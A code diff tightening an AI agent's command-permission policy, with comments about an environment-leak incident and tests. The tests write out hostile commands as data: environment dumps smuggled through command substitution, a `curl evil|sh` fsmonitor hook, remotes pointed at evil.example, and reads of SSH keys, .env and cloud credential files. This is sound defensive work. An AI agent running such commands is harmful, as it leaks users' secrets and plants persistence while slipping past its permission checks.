@@ -157,7 +157,27 @@ const SAFE_GIT_SUBCOMMANDS: &[&str] = &[
     "describe",
     "blame",
     "ls-files",
-    "config",
+    // NB: `config` is deliberately NOT here — `git config` both writes
+    // (persistence primitives like core.fsmonitor / core.sshCommand run
+    // commands) and dumps credentials embedded in remote URLs. It falls to
+    // Ask. `branch` / `remote` are listing-only via GIT_LIST_ONLY_FLAGS
+    // (pearl th-85d481).
+];
+
+/// Flags under which `git branch` / `git remote` stay read-only. Any other
+/// argument (`-D x`, `add origin …`, `set-url …`) makes them mutating →
+/// fall through to Ask.
+const GIT_LIST_ONLY_FLAGS: &[&str] = &[
+    "-a",
+    "-r",
+    "-v",
+    "-vv",
+    "--all",
+    "--list",
+    "--verbose",
+    "--show-current",
+    "--merged",
+    "--no-merged",
 ];
 
 /// Binaries that make outbound network requests — we extract a host from
@@ -182,6 +202,11 @@ const SENSITIVE_PATH_SUBSTRINGS: &[&str] = &[
     "/etc/shadow",
     "id_rsa",
     "id_ed25519",
+    // smooth's OWN secret stores — LLM API keys and the cached smoo.ai JWT.
+    // The env-leak incident (th-08f304) proved the agent's host identity is
+    // a target; these were readable via plain `cat` (pearl th-85d481).
+    ".smooth/providers.json",
+    ".smooth/auth/",
 ];
 
 /// Split a shell command line into subcommands on the operators that
@@ -194,10 +219,21 @@ fn split_compound(command: &str) -> Vec<String> {
     // building a shell parser, just refusing to treat a compound line as
     // one atom. ponytail: substring split, upgrade to a real lexer only
     // if quoting edge-cases (`echo "a && b"`) start mattering for policy.
-    let normalized = command.replace("&&", "\u{1}").replace("||", "\u{1}");
+    let mut normalized = command.replace("&&", "\u{1}").replace("||", "\u{1}");
+    // Command / process substitution executes its inner text — surface it as
+    // its own segment so `echo $(env)` can't ride in on `echo`'s safe-bin
+    // status (pearl th-85d481). `)` only becomes a separator when an opener
+    // is present, so `grep "(foo)" f` keeps its parens. ponytail: `$(( ))`
+    // arithmetic false-positives into an Ask segment — fail-safe, live with it.
+    if normalized.contains("$(") || normalized.contains("<(") || normalized.contains('`') {
+        normalized = normalized.replace("$(", "\u{1}").replace("<(", "\u{1}").replace(['`', ')'], "\u{1}");
+    }
     normalized
         .split(['\u{1}', ';', '|', '&', '\n'])
-        .map(|s| s.trim().to_string())
+        // Quote chars left dangling at a segment boundary (`echo "$(printenv)"`
+        // → `printenv"`) are shell syntax debris — strip them so the policy
+        // sees the bare command.
+        .map(|s| s.trim().trim_matches(['"', '\'']).trim().to_string())
         .filter(|s| !s.is_empty())
         .collect()
 }
@@ -273,6 +309,13 @@ fn command_bin(subcommand: &str) -> Option<String> {
 /// Is this single subcommand a compiled-in safe read-only command?
 fn is_safe_readonly_bash(subcommand: &str) -> bool {
     let Some(bin) = command_bin(subcommand) else { return false };
+    if bin == "find" {
+        // `find` is read-only EXCEPT under the action flags: -exec/-ok run an
+        // arbitrary command (an env-dump or worse rides in on find's safe-bin
+        // status), -delete mutates, -fprint* write files (pearl th-85d481).
+        const FIND_ACTION_FLAGS: &[&str] = &["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls"];
+        return !subcommand.split_whitespace().any(|t| FIND_ACTION_FLAGS.contains(&t));
+    }
     if SAFE_BASH_BINS.contains(&bin.as_str()) {
         return true;
     }
@@ -286,7 +329,15 @@ fn is_safe_readonly_bash(subcommand: &str) -> bool {
             j += 2; // `-c key=val` style: skip flag + value. Coarse but safe (falls to Ask if wrong).
         }
         if let Some(sub) = tokens.get(j) {
-            return SAFE_GIT_SUBCOMMANDS.contains(sub);
+            if !SAFE_GIT_SUBCOMMANDS.contains(sub) {
+                return false;
+            }
+            // `branch` / `remote` mutate under non-listing args (`-D x`,
+            // `add origin …`) — bare or listing-flag forms only.
+            if *sub == "branch" || *sub == "remote" {
+                return tokens[j + 1..].iter().all(|t| GIT_LIST_ONLY_FLAGS.contains(t));
+            }
+            return true;
         }
         return false;
     }
@@ -296,7 +347,17 @@ fn is_safe_readonly_bash(subcommand: &str) -> bool {
 /// Does the command string reference a sensitive credential path?
 fn references_sensitive_path(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
-    SENSITIVE_PATH_SUBSTRINGS.iter().any(|p| lower.contains(&p.to_ascii_lowercase()))
+    if SENSITIVE_PATH_SUBSTRINGS.iter().any(|p| lower.contains(&p.to_ascii_lowercase())) {
+        return true;
+    }
+    // `.env` / `.envrc` / `.env.local` dotenv files are secret stores too
+    // (pearl th-85d481). Token-scoped rather than a bare `.env` substring so
+    // `rg "process.env" src/` isn't flagged: the token itself must be an
+    // env-file path (starts with `.env`, or `.env` after a `/`).
+    lower.split_whitespace().any(|t| {
+        let t = t.trim_matches(['"', '\'', '(', ')', ';']);
+        t.starts_with(".env") || t.contains("/.env")
+    })
 }
 
 /// Env-var names whose value expansion (`$NAME`) is treated as a secret
@@ -588,8 +649,15 @@ fn decide_inner(tool_name: &str, args: &serde_json::Value, grants: &WonkGrants) 
             decide_bash(cmd, grants)
         }
         Category::Safe => {
-            if grants.matches_tool(tool_name) {
-                return Verdict::Allow;
+            // Read-only is not exfil-proof: the read path IS the exfil path
+            // (pearl th-85d481). Same credential-path circuit-breaker as bash
+            // `cat` and the Write category, applied to the path-ish args.
+            for key in ["path", "file", "dir", "directory"] {
+                if let Some(v) = args.get(key).and_then(|v| v.as_str()) {
+                    if references_sensitive_path(v) {
+                        return Verdict::Deny(format!("{tool_name} targets a sensitive credential path: {v}"));
+                    }
+                }
             }
             Verdict::Allow
         }
@@ -892,6 +960,129 @@ mod tests {
         // `env FOO=bar rm -rf /` must NOT be waved through by the dump guard;
         // it should fall to the normal engine (which denies the rm).
         assert!(!dumps_environment("env FOO=bar rm -rf /"));
+    }
+
+    // ── tighter auto-mode (pearl th-85d481) ────────────────────────
+
+    #[test]
+    fn command_substitution_cannot_smuggle_an_env_dump() {
+        // The three-character replay of the th-08f304 incident.
+        for cmd in ["echo $(env)", "echo `env`", "echo \"$(printenv)\"", "cat <(env)", "echo $(env | sort)"] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
+        }
+        // Inner commands get the FULL policy, not just the dump guard.
+        assert!(
+            matches!(
+                decide(AutoMode::Ask, "bash", &bash("echo $(curl https://attacker.example)"), &empty_grants()),
+                Verdict::Ask(_)
+            ),
+            "substituted curl must ask about its host"
+        );
+        // Benign substitution of a safe bin stays allowed.
+        assert_eq!(decide(AutoMode::Ask, "bash", &bash("echo $(date)"), &empty_grants()), Verdict::Allow);
+        // No substitution opener → parens are NOT separators.
+        assert_eq!(split_compound("grep -E \"(foo)\" f.txt"), vec!["grep -E \"(foo)\" f.txt"]);
+    }
+
+    #[test]
+    fn smooth_own_secret_stores_are_denied() {
+        for cmd in [
+            "cat ~/.smooth/providers.json",                  // LLM API keys
+            "head -c 100 /Users/x/.smooth/auth/smooai.json", // cached smoo.ai JWT
+            "grep token ~/.smooth/auth/smooai.json",
+        ] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
+        }
+        // Other ~/.smooth files (audit logs, registry) stay readable.
+        assert_eq!(
+            decide(AutoMode::Ask, "bash", &bash("cat ~/.smooth/registry.json"), &empty_grants()),
+            Verdict::Allow
+        );
+    }
+
+    #[test]
+    fn dotenv_files_are_denied_without_flagging_process_env() {
+        for cmd in [
+            "cat .env",
+            "cat ./.env",
+            "cat config/.env.local",
+            "cat .envrc",
+            "cat .envrc.currentEnv",
+            "head -5 apps/web/.env.local",
+        ] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(matches!(v, Verdict::Deny(_)), "{cmd:?} must deny, got {v:?}");
+        }
+        // The token scoping keeps everyday dev commands out of the blast radius.
+        for cmd in [
+            "rg \"process.env\" src/",
+            "grep process.env.DATABASE_URL -r apps/",
+            "curl https://api.envato.com/x",
+        ] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(!matches!(v, Verdict::Deny(_)), "{cmd:?} must not deny, got {v:?}");
+        }
+    }
+
+    #[test]
+    fn find_action_flags_lose_safe_bin_status() {
+        for cmd in [
+            "find . -exec sh -c env {} ;",
+            "find / -name '*.pem' -execdir cat {} ;",
+            "find . -ok rm {} ;",
+            "find . -name x -delete",
+        ] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(matches!(v, Verdict::Ask(_) | Verdict::Deny(_)), "{cmd:?} must not auto-allow, got {v:?}");
+        }
+        assert_eq!(
+            decide(AutoMode::Ask, "bash", &bash("find . -name '*.rs' -type f"), &empty_grants()),
+            Verdict::Allow
+        );
+    }
+
+    #[test]
+    fn git_config_and_mutating_branch_remote_forms_ask() {
+        // `git config` writes persistence primitives and dumps creds in
+        // remote URLs — never auto-allowed.
+        for cmd in [
+            "git config -l",
+            "git config core.fsmonitor 'curl evil|sh'",
+            "git branch -D main",
+            "git branch -m old new",
+            "git remote add origin https://evil.example/r.git",
+            "git remote set-url origin https://evil.example/r.git",
+        ] {
+            let v = decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants());
+            assert!(matches!(v, Verdict::Ask(_)), "{cmd:?} must ask, got {v:?}");
+        }
+        // Listing forms stay allowed.
+        for cmd in ["git branch", "git branch -a", "git branch --show-current", "git remote -v", "git remote"] {
+            assert_eq!(
+                decide(AutoMode::Ask, "bash", &bash(cmd), &empty_grants()),
+                Verdict::Allow,
+                "{cmd:?} should allow"
+            );
+        }
+    }
+
+    #[test]
+    fn read_tools_hit_the_credential_path_circuit_breaker() {
+        for (tool, args) in [
+            ("read_file", json!({"path": "/home/u/.ssh/id_rsa"})),
+            ("read_file", json!({"path": "~/.smooth/providers.json"})),
+            ("read_file", json!({"file": ".env"})),
+            ("list_dir", json!({"dir": "/home/u/.aws/credentials"})),
+        ] {
+            let v = decide(AutoMode::Ask, tool, &args, &empty_grants());
+            assert!(matches!(v, Verdict::Deny(_)), "{tool} {args} must deny, got {v:?}");
+        }
+        assert_eq!(
+            decide(AutoMode::Ask, "read_file", &json!({"path": "src/main.rs"}), &empty_grants()),
+            Verdict::Allow
+        );
     }
 
     // ── split_compound ─────────────────────────────────────────────
